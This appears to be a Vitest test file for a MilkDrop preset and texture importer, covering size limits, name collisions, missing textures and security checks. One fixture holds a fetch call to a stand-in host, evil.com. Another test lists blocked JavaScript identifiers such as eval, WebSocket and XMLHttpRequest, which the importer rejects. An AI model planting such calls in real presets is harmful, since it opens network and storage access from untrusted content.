import { describe, it, expect, vi, beforeEach } from 'vitest';
import { processPresetImport, processTextureImport } from '../importProcessor.ts';

// Mock idb-keyval
vi.mock('idb-keyval', () => ({
  set: vi.fn().mockResolvedValue(undefined),
  del: vi.fn().mockResolvedValue(undefined),
  get: vi.fn().mockResolvedValue(undefined),
  keys: vi.fn().mockResolvedValue([]),
}));

// Mock milkdrop-preset-converter — passes raw text into init_eqs_str
// so that validatePreset's EEL scanner can still detect blocked identifiers.
// Sampler references in the raw text will also be detected by findMissingTextures.
const mockConvert = (text: string) => ({ init_eqs_str: text });
vi.mock('milkdrop-preset-converter', () => ({
  default: mockConvert,
  convertPreset: mockConvert,
}));

// Mock useImportedPresetsStore
const mockAddPreset = vi.fn().mockResolvedValue(undefined);
const mockCacheConverted = vi.fn();
vi.mock('../../store/useImportedPresetsStore.ts', () => ({
  useImportedPresetsStore: {
    getState: () => ({
      addPreset: mockAddPreset,
      cacheConverted: mockCacheConverted,
    }),
  },
}));

// Mock useImportedTexturesStore
const mockAddTexture = vi.fn().mockResolvedValue(undefined);
vi.mock('../../store/useImportedTexturesStore.ts', () => ({
  useImportedTexturesStore: {
    getState: () => ({
      addTexture: mockAddTexture,
    }),
  },
}));

// Mock useSettingsStore
const mockAddImportedPresetMeta = vi.fn();
const mockAddImportedTextureMeta = vi.fn();
vi.mock('../../store/useSettingsStore.ts', () => ({
  useSettingsStore: {
    getState: () => ({
      addImportedPresetMeta: mockAddImportedPresetMeta,
      addImportedTextureMeta: mockAddImportedTextureMeta,
    }),
  },
}));

function createMilkFile(name: string, content = '[preset00]\nfoo=bar'): File {
  return new File([content], `${name}.milk`, { type: 'application/octet-stream' });
}

describe('processPresetImport', () => {
  const defaultOpts = {
    importedNameSet: new Set<string>(),
    importedTextureNameSet: new Set<string>(),
    presetPackMap: new Map<string, string>(),
    onProgress: vi.fn(),
  };

  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('imports valid .milk files successfully', async () => {
    const files = [createMilkFile('Preset A'), createMilkFile('Preset B')];
    const results = await processPresetImport(files, defaultOpts);

    expect(results).toHaveLength(2);
    expect(results[0].status).toBe('success');
    expect(results[0].presetName).toBe('Preset A');
    expect(results[1].status).toBe('success');
    expect(results[1].presetName).toBe('Preset B');
    expect(mockAddPreset).toHaveBeenCalledTimes(2);
    expect(mockAddImportedPresetMeta).toHaveBeenCalledTimes(2);
  });

  it('calls onProgress for each file', async () => {
    const onProgress = vi.fn();
    const files = [createMilkFile('A'), createMilkFile('B'), createMilkFile('C')];
    await processPresetImport(files, { ...defaultOpts, onProgress });

    expect(onProgress).toHaveBeenCalledTimes(3);
    expect(onProgress).toHaveBeenNthCalledWith(1, expect.any(Object), 1, 3);
    expect(onProgress).toHaveBeenNthCalledWith(2, expect.any(Object), 2, 3);
    expect(onProgress).toHaveBeenNthCalledWith(3, expect.any(Object), 3, 3);
  });

  it('rejects invalid file extensions', async () => {
    const file = new File(['content'], 'bad.txt', { type: 'text/plain' });
    const results = await processPresetImport([file], defaultOpts);

    expect(results).toHaveLength(1);
    expect(results[0].status).toBe('failed');
    expect(results[0].errorCode).toBe('invalidFileType');
  });

  it('rejects files exceeding size limit', async () => {
    const bigContent = 'x'.repeat(500_001);
    const file = new File([bigContent], 'big.milk');
    const results = await processPresetImport([file], defaultOpts);

    expect(results).toHaveLength(1);
    expect(results[0].status).toBe('failed');
    expect(results[0].errorCode).toBe('fileTooLarge');
  });

  it('rejects duplicate names against existing imports', async () => {
    const files = [createMilkFile('Existing')];
    const results = await processPresetImport(files, {
      ...defaultOpts,
      importedNameSet: new Set(['Existing']),
    });

    expect(results[0].status).toBe('failed');
    expect(results[0].errorCode).toBe('duplicateName');
  });

  it('detects intra-batch duplicates', async () => {
    const files = [createMilkFile('Same'), createMilkFile('Same')];
    const results = await processPresetImport(files, defaultOpts);

    expect(results[0].status).toBe('success');
    expect(results[1].status).toBe('failed');
    expect(results[1].errorCode).toBe('duplicateName');
  });

  it('rejects native name collisions', async () => {
    const files = [createMilkFile('Bundled')];
    const results = await processPresetImport(files, {
      ...defaultOpts,
      presetPackMap: new Map([['Bundled', 'Extra']]),
    });

    expect(results[0].status).toBe('failed');
    expect(results[0].errorCode).toBe('nativeNameCollision');
  });

  it('imports PS3 presets successfully', async () => {
    const ps3Content = 'PSVERSION=3\nPSVERSION_WARP=3\nPSVERSION_COMP=3\n[preset00]\nfoo=bar';
    const file = new File([ps3Content], 'ps3.milk');
    const results = await processPresetImport([file], defaultOpts);

    expect(results[0].status).toBe('success');
    expect(results[0].presetName).toBe('ps3');
  });

  it('reports missing textures as warnings (not failures)', async () => {
    // Mock converter passes raw text to init_eqs_str — include a sampler ref
    const file = createMilkFile('TexturePreset', 'sampler_custom_texture\nfoo=bar');
    const results = await processPresetImport([file], defaultOpts);

    expect(results[0].status).toBe('warning');
    expect(results[0].warnings).toContain('custom_texture');
  });

  it('handles mixed success and failure', async () => {
    const files = [
      createMilkFile('Good'),
      new File(['content'], 'bad.txt'),
      createMilkFile('Also Good'),
    ];
    const results = await processPresetImport(files, defaultOpts);

    expect(results[0].status).toBe('success');
    expect(results[1].status).toBe('failed');
    expect(results[2].status).toBe('success');
  });

  it('rejects presets with blocked EEL identifiers', async () => {
    // Mock converter passes raw text into init_eqs_str, so blocked identifiers trigger
    const file = createMilkFile('Evil', 'fetch("http://evil.com")');
    const results = await processPresetImport([file], defaultOpts);

    expect(results[0].status).toBe('failed');
    expect(results[0].errorCode).toBe('securityBlocked');
  });

  it('rejects all blocked identifiers', async () => {
    const blocked = [
      'eval',
      'Function',
      'WebSocket',
      'localStorage',
      'sessionStorage',
      'indexedDB',
      'XMLHttpRequest',
      'importScripts',
      'document',
      'window',
      'globalThis',
      'self',
      'top',
      'parent',
      'frames',
    ];
    for (const id of blocked) {
      const file = createMilkFile(`test_${id}`, `x = ${id};`);
      const results = await processPresetImport([file], {
        ...defaultOpts,
        onProgress: vi.fn(),
      });
      expect(results[0].status).toBe('failed');
      expect(results[0].errorCode).toBe('securityBlocked');
    }
  });
});

describe('processTextureImport', () => {
  const defaultOpts = {
    existingTextureNames: new Set<string>(),
    onProgress: vi.fn(),
  };

  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('rejects non-image files', async () => {
    const file = new File(['text'], 'doc.txt', { type: 'text/plain' });
    const results = await processTextureImport([file], defaultOpts);

    expect(results[0].status).toBe('failed');
    expect(results[0].errorCode).toBe('invalidFileType');
  });

  it('rejects files exceeding 2MB', async () => {
    const bigContent = 'x'.repeat(2_097_153);
    const file = new File([bigContent], 'big.png', { type: 'image/png' });
    const results = await processTextureImport([file], defaultOpts);

    expect(results[0].status).toBe('failed');
    expect(results[0].errorCode).toBe('fileTooLarge');
  });

  it('rejects textures that shadow built-in names', async () => {
    // lichen is a built-in butterchurn extra image
    const file = new File(['x'], 'lichen.png', { type: 'image/png' });
    const results = await processTextureImport([file], defaultOpts);

    expect(results[0].status).toBe('failed');
    expect(results[0].errorCode).toBe('builtinTextureShadow');
  });

  it('calls onProgress for each file', async () => {
    const onProgress = vi.fn();
    const files = [
      new File(['x'], 'a.txt', { type: 'text/plain' }),
      new File(['x'], 'b.txt', { type: 'text/plain' }),
    ];
    await processTextureImport(files, { ...defaultOpts, onProgress });

    expect(onProgress).toHaveBeenCalledTimes(2);
    expect(onProgress).toHaveBeenNthCalledWith(1, expect.any(Object), 1, 2);
    expect(onProgress).toHaveBeenNthCalledWith(2, expect.any(Object), 2, 2);
  });
});
